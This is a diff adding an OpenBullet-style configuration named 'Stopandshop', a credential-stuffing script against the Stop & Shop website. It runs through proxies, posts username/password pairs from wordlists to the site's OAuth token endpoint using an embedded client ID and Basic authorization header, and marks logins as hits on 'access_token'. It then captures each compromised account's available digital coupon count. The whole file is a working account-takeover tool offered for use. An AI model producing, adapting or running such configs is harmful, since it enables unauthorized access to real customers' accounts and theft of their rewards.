@@ -1,0 +1,58 @@
+[SETTINGS]
+{
+  "Name": "Stopandshop",
+  "SuggestedBots": 1,
+  "LastModified": "2018-06-02T10:30:27.2457966+00:00",
+  "AdditionalInfo": "",
+  "Author": "Doberman",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET REQUEST GET "https://stopandshop.com/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "upgrade-insecure-requests: 1" 
+#POST REQUEST POST "https://stopandshop.com/auth/oauth/token" AutoRedirect=TRUE 
+  CONTENT "grant_type=password&username=<USER>&password=<PASS>&client_id=54a8c012-9956-44a5-961b-20f93521c15e" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER "referer:  https://stopandshop.com/" 
+  HEADER "origin:  https://stopandshop.com" 
+  HEADER "authorization: Basic NTRhOGMwMTItOTk1Ni00NGE1LTk2MWItMjBmOTM1MjFjMTVlOjczNzk3ZTQ3YmRhMGQ5NzQ3ZjlmOGI2NTg5YTc2YzgzNjhjODI3ZmRkNjU0YmFhNjQ5MjYwZWY0OGI0MmM1YTY=" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "error_description" 
+    KEY "invalid_grant" 
+    KEY "error" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+    KEY "token_type" 
+    KEY "expires_in" 
+#GET_CAPTURE REQUEST GET "https://stopandshop.com/coupons-weekly-circular/digital-coupons/#/available" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "Available Coupons: <span class=\"h-blue h-bold js-couponStats-numAvlOffers\">" "<" Recursive=FALSE -> CAP "Available Coupons" "" "" 
